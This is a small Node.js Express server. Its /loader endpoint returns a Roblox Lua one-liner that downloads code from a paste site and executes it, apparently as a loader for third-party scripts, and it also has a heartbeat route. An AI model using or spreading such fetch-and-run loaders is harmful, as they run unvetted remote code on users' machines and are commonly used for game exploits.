const express = require('express');
const app = express();
app.use(express.json());

app.get('/loader', (req, res) => {
    const mySecureString = `loadstring(game:HttpGet("https://pastefy.app"))()`;
    res.send(mySecureString);
});

app.post('/heartbeat', (req, res) => {
    res.status(200).json({ status: "alive" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server live on port ${PORT}`));
